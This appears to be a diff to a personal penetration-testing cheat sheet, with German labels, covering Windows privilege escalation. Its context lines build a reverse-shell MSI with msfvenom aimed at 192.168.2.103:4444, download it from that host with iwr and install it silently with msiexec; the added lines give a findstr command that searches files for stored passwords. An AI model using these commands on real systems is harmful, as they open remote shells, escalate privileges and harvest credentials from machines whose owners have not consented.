@@ -40,3 +40,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.103 LPORT=4444 -f msi 
 iwr http://192.168.2.103:8080/evil.msi -OutFile C:\Users\Public\evil.msi
 msiexec /quiet /qn /i C:\Users\Public\evil.msi
 für allaccess Exploit
+
+findstr /si password *.xml *.ini *.txt 
+auf Windows Passwortdatei finden
